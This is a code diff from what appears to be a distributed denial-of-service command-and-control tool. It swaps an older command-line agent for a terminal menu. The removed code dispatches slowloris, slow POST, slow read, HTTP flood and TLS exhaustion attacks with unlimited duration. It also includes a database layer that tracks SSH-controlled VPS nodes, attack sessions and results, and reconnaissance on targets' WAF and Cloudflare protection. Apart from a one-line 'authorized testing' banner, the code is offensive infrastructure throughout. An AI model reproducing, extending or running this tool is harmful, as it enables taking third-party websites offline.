+                for check, result in results['security_checks'].items():
+                    status = f"{Colors.GREEN}Pass{Colors.RESET}" if result['pass'] else f"{Colors.RED}Fail{Colors.RESET}"
+                    print(f"{check}: {status}")
+                    if result['message']:
+                        print(f"  {result['message']}")
+            else:
+                print(f"\n{Colors.RED}[ERROR] No SSL/TLS connection available{Colors.RESET}")
+                if results['error']:
+                    print(f"Error: {results['error']}")
+            
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error in SSL information: {str(e)}")
+            logger.error(traceback.format_exc())
+        
+        input("\nPress Enter to continue...")
+    
+    def system_status_menu(self):
+        """System status menu"""
+        self.terminal.clear_screen()
+        self.terminal.print_banner(VERSION)
+        
+        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
+        print("=" * 50)
+        
+        # Database status
+        print(f"{Colors.BOLD}DATABASE:{Colors.RESET}")
+        vps_count = len(self.db_manager.get_all_vps())
+        attack_count = len(self.db_manager.get_attack_sessions())
+        active_attacks = len(self.db_manager.get_active_attack_sessions())
+        
+        print(f"VPS Nodes: {vps_count}")
+        print(f"Attack Sessions: {attack_count}")
+        print(f"Active Attacks: {active_attacks}")
+        
+        # SSH connections
+        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
+        connection_count = len(self.ssh_manager.connections)
+        print(f"Active Connections: {connection_count}")
+        
+        if connection_count > 0:
+            for ip, conn in self.ssh_manager.connections.items():
+                print(f"  - {ip}: {Colors.GREEN}Connected{Colors.RESET}")
+        
+        # System resources
+        if PSUTIL_AVAILABLE:
+            print(f"\n{Colors.BOLD}SYSTEM RESOURCES:{Colors.RESET}")
+            cpu_percent = psutil.cpu_percent(interval=1)
+            memory = psutil.virtual_memory()
+            disk = psutil.disk_usage('/')
+            
+            print(f"CPU Usage: {cpu_percent}%")
+            print(f"Memory Usage: {memory.percent}% ({self._format_bytes(memory.used)}/{self._format_bytes(memory.total)})")
+            print(f"Disk Usage: {disk.percent}% ({self._format_bytes(disk.used)}/{self._format_bytes(disk.total)})")
+        
+        # Network interfaces
+        if PSUTIL_AVAILABLE:
+            print(f"\n{Colors.BOLD}NETWORK INTERFACES:{Colors.RESET}")
+            net_io = psutil.net_io_counters(pernic=True)
+            
+            for interface, stats in net_io.items():
+                print(f"{interface}:")
+                print(f"  Sent: {self._format_bytes(stats.bytes_sent)}")
+                print(f"  Received: {self._format_bytes(stats.bytes_recv)}")
+        
+        input("\nPress Enter to continue...")
 
 def main():
-    global attacker
-    
-    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent')
-    parser.add_argument('target',help='Target URL or hostname')
-    parser.add_argument('attack_type',choices=['slowloris','slow_post','slow_read','http_flood','ssl_exhaust'],help='Type of attack to perform')
-    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100)')
-    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15)')
-    parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
-    parser.add_argument('--requests','-r',type=int,default=1000,help='Requests per connection for HTTP flood (default: 1000)')
-    
-    args=parser.parse_args()
-    
-    # Validate arguments
-    if args.connections < 1:
-        logger.error("Connections must be at least 1")
+    """Main function to run the application"""
+    # Check Python version
+    if sys.version_info < (3, 6):
+        print("Python 3.6+ required")
         sys.exit(1)
     
-    if args.delay < 0:
-        logger.error("Delay cannot be negative")
-        sys.exit(1)
+    # Create necessary directories
+    os.makedirs('logs', exist_ok=True)
     
-    # Parse target
-    if args.target.startswith('http://') or args.target.startswith('https://'):
-        parsed=urlparse(args.target)
-        target_host=parsed.hostname
-        target_port=parsed.port or (443 if parsed.scheme=='https' else 80)
-    else:
-        target_host=args.target.split(':')[0]
-        if ':' in args.target:
-            try:
-                target_port = int(args.target.split(':')[1])
-            except ValueError:
-                target_port = 80
-        else:
-            target_port=80
-    
-    logger.info("=" * 60)
-    logger.info("SLOW HTTP ATTACK AGENT")
-    logger.info("=" * 60)
-    logger.info(f"Target: {target_host}:{target_port}")
-    logger.info(f"Attack: {args.attack_type.upper()}")
-    logger.info(f"Connections: {args.connections}")
-    logger.info(f"Delay: {args.delay}s")
-    logger.info(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
-    logger.info("=" * 60)
-    logger.info("WARNING: FOR AUTHORIZED TESTING ONLY!")
-    logger.info("=" * 60)
-    
-    # Set up signal handlers
-    signal.signal(signal.SIGINT,signal_handler)
-    signal.signal(signal.SIGTERM,signal_handler)
-    
-    # Create attacker instance
-    attacker=SlowHTTPAttack(target_host,target_port)
-    
+    # Initialize and run TUI
     try:
-        if args.attack_type == "slowloris":
-            attacker.slowloris_attack(args.connections, args.delay, args.duration)
-        elif args.attack_type == "slow_post":
-            attacker.slow_post_attack(args.connections, args.delay, args.duration)
-        elif args.attack_type == "slow_read":
-            attacker.slow_read_attack(args.connections, args.delay, args.duration)
-        elif args.attack_type == "http_flood":
-            attacker.http_flood_attack(args.connections, args.requests, args.duration)
-        elif args.attack_type == "ssl_exhaust":
-            attacker.ssl_exhaust_attack(args.connections, args.duration)
-    except KeyboardInterrupt:
-        logger.info("Interrupted, stopping attack...")
-        attacker.stop_attack()
+        print("Starting Distributed Slow HTTP C2 - ADVANCED EDITION...")
+        tui = SlowHTTPTUI()
+        tui.run()
     except Exception as e:
-        logger.error(f"Error: {str(e)}")
-        attacker.stop_attack()
-    finally:
-        logger.info("Attack completed")
+        logger.critical(f"Fatal error: {str(e)}")
+        logger.critical(traceback.format_exc())
+        print(f"Fatal error: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
-'''
-    
-    def _get_advanced_agent_script(self):
-        """Get the advanced agent script with additional attack methods"""
-        # This would be a more sophisticated version of the agent script
-        # For brevity, we'll return the standard script for now
-        return self._get_standard_agent_script()
-    
-    def get_connection_status(self, ip):
-        """Check if connection is active"""
-        return ip in self.connections and self._check_connection_alive(ip)
-    
-    def close_all_connections(self):
-        """Close all SSH connections"""
-        for ip in list(self.connections.keys()):
-            self.disconnect_vps(ip)
-        logger.info("All SSH connections closed")
-
-class DatabaseManager:
-    """Manages database operations with improved error handling and performance"""
-    
-    def __init__(self, db_file='c2_database.db'):
-        """Initialize database manager with specified database file"""
-        self.db_file = db_file
-        self.connection_pool = queue.Queue(maxsize=5)  # Connection pool for better performance
-        self.init_database()
-        
-        # Fill connection pool
-        for _ in range(3):  # Start with 3 connections in the pool
-            self._add_connection_to_pool()
-    
-    def _add_connection_to_pool(self):
-        """Add a new connection to the pool"""
-        try:
-            conn = sqlite3.connect(self.db_file)
-            conn.row_factory = sqlite3.Row  # Return rows as dictionaries
-            self.connection_pool.put(conn, block=False)
-            return True
-        except queue.Full:
-            # Pool is full, close the connection
-            conn.close()
-            return False
-        except Exception as e:
-            logger.error(f"Failed to create database connection: {str(e)}")
-            return False
-    
-    def _get_connection(self):
-        """Get a connection from the pool or create a new one"""
-        try:
-            # Try to get a connection from the pool (non-blocking)
-            return self.connection_pool.get(block=False)
-        except queue.Empty:
-            # Pool is empty, create a new connection
-            try:
-                conn = sqlite3.connect(self.db_file)
-                conn.row_factory = sqlite3.Row
-                return conn
-            except Exception as e:
-                logger.error(f"Failed to create database connection: {str(e)}")
-                return None
-    
-    def _return_connection(self, conn):
-        """Return a connection to the pool or close it"""
-        if conn:
-            try:
-                self.connection_pool.put(conn, block=False)
-            except queue.Full:
-                # Pool is full, close the connection
-                conn.close()
-    
-    def init_database(self):
-        """Initialize database with improved schema and error handling"""
-        conn = None
-        try:
-            conn = sqlite3.connect(self.db_file)
-            cursor = conn.cursor()
-            
-            # VPS nodes table with improved schema
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS vps_nodes (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    ip_address TEXT NOT NULL UNIQUE,
-                    username TEXT NOT NULL,
-                    password TEXT NOT NULL,
-                    ssh_port INTEGER DEFAULT 22,
-                    status TEXT DEFAULT 'offline',
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    last_seen TIMESTAMP,
-                    location TEXT,
-                    capabilities TEXT,
-                    last_check_result TEXT,
-                    system_info TEXT,
-                    tags TEXT,
-                    notes TEXT
-                )
-            ''')
-            
-            # Attack sessions table with improved schema
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS attack_sessions (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    session_name TEXT NOT NULL,
-                    target_url TEXT NOT NULL,
-                    target_host TEXT,
-                    attack_type TEXT NOT NULL,
-                    vps_nodes TEXT,
-                    start_time TIMESTAMP,
-                    end_time TIMESTAMP,
-                    status TEXT DEFAULT 'pending',
-                    parameters TEXT,
-                    results TEXT,
-                    success_rate REAL,
-                    notes TEXT,
-                    target_info TEXT
-                )
-            ''')
-            
-            # Attack results table with improved schema
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS attack_results (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    session_id INTEGER,
-                    vps_ip TEXT,
-                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    connections_active INTEGER DEFAULT 0,
-                    packets_sent INTEGER DEFAULT 0,
-                    bytes_sent INTEGER DEFAULT 0,
-                    status TEXT,
-                    cpu_usage REAL,
-                    memory_usage REAL,
-                    error_count INTEGER DEFAULT 0,
-                    response_codes TEXT,
-                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
-                )
-            ''')
-            
-            # System logs table for better auditing
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS system_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    event_type TEXT,
-                    description TEXT,
-                    source_ip TEXT,
-                    user_agent TEXT,
-                    severity TEXT
-                )
-            ''')
-            
-            # Target information table for reconnaissance data
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS target_info (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    host TEXT NOT NULL UNIQUE,
-                    ip_addresses TEXT,
-                    open_ports TEXT,
-                    web_server TEXT,
-                    waf_detected BOOLEAN DEFAULT 0,
-                    waf_type TEXT,
-                    cloudflare_protected BOOLEAN DEFAULT 0,
-                    ssl_info TEXT,
-                    dns_records TEXT,
-                    whois_info TEXT,
-                    scan_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    notes TEXT
-                )
-            ''')
-            
-            conn.commit()
-            
-            # Set secure permissions
-            os.chmod(self.db_file, 0o600)
-            logger.info(f"Database initialized: {self.db_file}")
-            
-        except sqlite3.Error as e:
-            logger.error(f"Database initialization error: {str(e)}")
-            if conn:
-                conn.rollback()
-            raise
-        finally:
-            if conn:
-                conn.close()
-    
-    def execute_query(self, query, params=(), fetch_one=False, fetch_all=False):
-        """Execute SQL query with proper error handling and connection management"""
-        conn = self._get_connection()
-        if not conn:
-            logger.error("Failed to get database connection")
-            return None
-            
-        try:
-            cursor = conn.cursor()
-            cursor.execute(query, params)
-            
-            result = None
-            if fetch_one:
-                result = cursor.fetchone()
-            elif fetch_all:
-                result = cursor.fetchall()
-            else:
-                conn.commit()
-                result = cursor.lastrowid
-                
-            return result
-        except sqlite3.Error as e:
-            conn.rollback()
-            logger.error(f"Database error: {str(e)}")
-            logger.error(f"Query: {query}")
-            logger.error(f"Params: {params}")
-            return None
-        finally:
-            self._return_connection(conn)
-    
-    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown", tags=None):
-        """Add VPS to database with input validation and tags support"""
-        try:
-            # Input validation
-            if not ip or not username or not encrypted_password:
-                return None, "Missing required fields"
-            
-            # Check if VPS already exists
-            existing = self.execute_query(
-                "SELECT id FROM vps_nodes WHERE ip_address = ?", 
-                (ip,), 
-                fetch_one=True
-            )
-            
-            if existing:
-                return None, "VPS with this IP already exists"
-            
-            # Process tags
-            tags_json = json.dumps(tags) if tags else None
-            
-            # Insert new VPS
-            vps_id = self.execute_query(
-                '''
-                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location, tags)
-                VALUES (?, ?, ?, ?, ?, ?)
-                ''', 
-                (ip, username, encrypted_password, port, location, tags_json)
-            )
-            
-            # Log the action
-            self.log_system_event("vps_added", f"Added VPS {ip}", ip)
-            
-            return vps_id, "VPS added successfully"
-        except Exception as e:
-            logger.error(f"Error adding VPS: {str(e)}")
-            return None, f"Error: {str(e)}"
-    
-    def get_all_vps(self):
-        """Get all VPS nodes with error handling"""
-        try:
-            return self.execute_query(
-                'SELECT * FROM vps_nodes ORDER BY id', 
-                fetch_all=True
-            ) or []
-        except Exception as e:
-            logger.error(f"Error getting VPS list: {str(e)}")
-            return []
-    
-    def update_vps_status(self, ip, status, check_result=None):
-        """Update VPS status with additional info"""
-        try:
-            query = '''
-                UPDATE vps_nodes 
-                SET status = ?, last_seen = ?
-            '''
-            params = [status, datetime.now().isoformat()]
-            
-            if check_result:
-                query += ", last_check_result = ?"
-                params.append(check_result)
-                
-            query += " WHERE ip_address = ?"
-            params.append(ip)
-            
-            self.execute_query(query, tuple(params))
-            return True
-        except Exception as e:
-            logger.error(f"Error updating VPS status: {str(e)}")
-            return False
-    
-    def update_vps_system_info(self, ip, system_info):
-        """Update VPS system information"""
-        try:
-            self.execute_query(
-                "UPDATE vps_nodes SET system_info = ? WHERE ip_address = ?",
-                (json.dumps(system_info), ip)
-            )
-            return True
-        except Exception as e:
-            logger.error(f"Error updating VPS system info: {str(e)}")
-            return False
-    
-    def update_vps_notes(self, ip, notes):
-        """Update VPS notes"""
-        try:
-            self.execute_query(
-                "UPDATE vps_nodes SET notes = ? WHERE ip_address = ?",
-                (notes, ip)
-            )
-            return True
-        except Exception as e:
-            logger.error(f"Error updating VPS notes: {str(e)}")
-            return False
-    
-    def update_vps_tags(self, ip, tags):
-        """Update VPS tags"""
-        try:
-            self.execute_query(
-                "UPDATE vps_nodes SET tags = ? WHERE ip_address = ?",
-                (json.dumps(tags), ip)
-            )
-            return True
-        except Exception as e:
-            logger.error(f"Error updating VPS tags: {str(e)}")
-            return False
-    
-    def remove_vps(self, ip):
-        """Remove VPS with confirmation and logging"""
-        try:
-            result = self.execute_query(
-                'DELETE FROM vps_nodes WHERE ip_address = ?', 
-                (ip,)
-            )
-            
-            if result:
-                self.log_system_event("vps_removed", f"Removed VPS {ip}", ip)
-                return True
-            return False
-        except Exception as e:
-            logger.error(f"Error removing VPS: {str(e)}")
-            return False
-    
-    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters, target_info=None):
-        """Create attack session with improved validation and target info"""
-        try:
-            # Input validation
-            if not session_name or not target_url or not attack_type or not vps_list:
-                return None, "Missing required fields"
-                
-            # Sanitize inputs
-            session_name = re.sub(r'[^\w\-_]', '_', session_name)
-            
-            session_id = self.execute_query(
-                '''
-                INSERT INTO attack_sessions 
-                (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status, target_info)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-                ''', 
-                (
-                    session_name, 
-                    target_url, 
-                    target_host, 
-                    attack_type, 
-                    json.dumps(vps_list), 
-                    json.dumps(parameters), 
-                    datetime.now().isoformat(), 
-                    'running',
-                    json.dumps(target_info) if target_info else None
-                )
-            )
-            
-            # Log the action
-            self.log_system_event(
-                "attack_started", 
-                f"Started {attack_type} attack on {target_host} using {len(vps_list)} VPS", 
-                target_host
-            )
-            
-            return session_id, "Attack session created"
-        except Exception as e:
-            logger.error(f"Error creating attack session: {str(e)}")
-            return None, f"Error: {str(e)}"
-    
-    def get_attack_sessions(self, limit=20, status=None):
-        """Get attack sessions with filtering by status"""
-        try:
-            query = 'SELECT * FROM attack_sessions'
-            params = []
-            
-            if status:
-                query += ' WHERE status = ?'
-                params.append(status)
-                
-            query += ' ORDER BY start_time DESC LIMIT ?'
-            params.append(limit)
-            
-            return self.execute_query(query, tuple(params), fetch_all=True) or []
-        except Exception as e:
-            logger.error(f"Error getting attack sessions: {str(e)}")
-            return []
-    
-    def get_attack_session(self, session_id):
-        """Get a specific attack session by ID"""
-        try:
-            return self.execute_query(
-                'SELECT * FROM attack_sessions WHERE id = ?',
-                (session_id,),
-                fetch_one=True
-            )
-        except Exception as e:
-            logger.error(f"Error getting attack session {session_id}: {str(e)}")
-            return None
-    
-    def update_attack_status(self, session_id, status, results=None):
-        """Update attack session status"""
-        try:
-            query = "UPDATE attack_sessions SET status = ?"
-            params = [status]
-            
-            if status in ['stopped', 'completed', 'failed']:
-                query += ", end_time = ?"
-                params.append(datetime.now().isoformat())
-            
-            if results:
-                query += ", results = ?"
-                params.append(json.dumps(results))
-                
-            query += " WHERE id = ?"
-            params.append(session_id)
-            
-            self.execute_query(query, tuple(params))
-            return True
-        except Exception as e:
-            logger.error(f"Error updating attack status: {str(e)}")
-            return False
-    
-    def update_attack_notes(self, session_id, notes):
-        """Update attack session notes"""
-        try:
-            self.execute_query(
-                "UPDATE attack_sessions SET notes = ? WHERE id = ?",
-                (notes, session_id)
-            )
-            return True
-        except Exception as e:
-            logger.error(f"Error updating attack notes: {str(e)}")
-            return False
-    
-    def log_system_event(self, event_type, description, source_ip=None, severity="INFO"):
-        """Log system events for auditing"""
-        try:
-            self.execute_query(
-                '''
-                INSERT INTO system_logs (event_type, description, source_ip, severity)
-                VALUES (?, ?, ?, ?)
-                ''',
-                (event_type, description, source_ip, severity)
-            )
-            return True
-        except Exception as e:
-            logger.error(f"Error logging system event: {str(e)}")
-            return False
-    
-    def record_attack_result(self, session_id, vps_ip, connections, packets, status, bytes_sent=0, cpu=None, memory=None, errors=0, response_codes=None):
-        """Record attack results with performance metrics and response codes"""
-        try:
-            self.execute_query(
-                '''
-                INSERT INTO attack_results 
-                (session_id, vps_ip, connections_active, packets_sent, bytes_sent, status, cpu_usage, memory_usage, error_count, response_codes)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-                ''',
-                (session_id, vps_ip, connections, packets, bytes_sent, status, cpu, memory, errors, json.dumps(response_codes) if response_codes else None)
-            )
-            return True
-        except Exception as e:
-            logger.error(f"Error recording attack result: {str(e)}")
-            return False
-    
-    def get_attack_results(self, session_id):
-        """Get all results for a specific attack session"""
-        try:
-            return self.execute_query(
-                'SELECT * FROM attack_results WHERE session_id = ? ORDER BY timestamp',
-                (session_id,),
-                fetch_all=True
-            ) or []
-        except Exception as e:
-            logger.error(f"Error getting attack results: {str(e)}")
-            return []
-    
-    def save_target_info(self, host, info):
-        """Save or update target information"""
-        try:
-            # Check if target already exists
-            existing = self.execute_query(
-                "SELECT id FROM target_info WHERE host = ?", 
-                (host,), 
-                fetch_one=True
-            )
-            
-            if existing:
-                # Update existing record
-                query = '''
-                    UPDATE target_info SET 
-                    ip_addresses = ?, open_ports = ?, web_server = ?, 
-                    waf_detected = ?, waf_type = ?, cloudflare_protected = ?,
-                    ssl_info = ?, dns_records = ?, whois_info = ?,
-                    scan_date = ?, notes = ?
-                    WHERE host = ?
-                '''
-                params = (
-                    json.dumps(info.get('ip_addresses', [])),
-                    json.dumps(info.get('open_ports', [])),
-                    info.get('web_server', ''),
-                    1 if info.get('waf_detected', False) else 0,
-                    info.get('waf_type', ''),
-                    1 if info.get('cloudflare_protected', False) else 0,
-                    json.dumps(info.get('ssl_info', {})),
-                    json.dumps(info.get('dns_records', {})),
-                    json.dumps(info.get('whois_info', {})),
-                    datetime.now().isoformat(),
-                    info.get('notes', ''),
-                    host
-                )
-                self.execute_query(query, params)
-                return existing['id']
-            else:
-                # Insert new record
-                query = '''
-                    INSERT INTO target_info 
-                    (host, ip_addresses, open_ports, web_server, waf_detected, waf_type, 
-                    cloudflare_protected, ssl_info, dns_records, whois_info, notes)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-                '''
-                params = (
-                    host,
-                    json.dumps(info.get('ip_addresses', [])),
-                    json.dumps(info.get('open_ports', [])),
-                    info.get('web_server', ''),
-                    1 if info.get('waf_detected', False) else 0,
-                    info.get('waf_type', ''),
-                    1 if info.get('cloudflare_protected', False) else 0,
-                    json.dumps(info.get('ssl_info', {})),
-                    json.dumps(info.get('dns_records', {})),
-                    json.dumps(info.get('whois_info', {})),
-                    info.get('notes', '')
-                )
-                return self.execute_query(query, params)
-        except Exception as e:
-            logger.error(f"Error saving target info: {str(e)}")
-            return None
-    
-    def get_target_info(self, host):
-        """Get target information by hostname"""
-        try:
-            result = self.execute_query(
-                'SELECT * FROM target_info WHERE host = ?',
-                (host,),
-                fetch_one=True
-            )
-            
-            if result:
-                # Convert JSON strings to Python objects
-                info = dict(result)
-                for key in ['ip_addresses', 'open_ports', 'ssl_info', 'dns_records', 'whois_info']:
-                    if info.get(key):
-                        try:
-                            info[key] = json.loads(info[key])
-                        except:
-                            info[key] = {}
-                
-                # Convert integer booleans to Python booleans
-                info['waf_detected'] = bool(info.get('waf_detected', 0))
-                info['cloudflare_protected'] = bool(info.get('cloudflare_protected', 0))
-                
-                return info
-            return None
-        except Exception as e:
-            logger.error(f"Error getting target info: {str(e)}")
-            return None
-    
-    def close(self):
-        """Close all database connections in the pool"""
-        try:
-            while not self.connection_pool.empty():
-                conn = self.connection_pool.get(block=False)
-                if conn:
-                    conn.close()
-        except Exception as e:
-            logger.error(f"Error closing database connections: {str(e)}")
-            
-    def __del__(self):
-        """Destructor to ensure connections are closed"""
-        self.close()
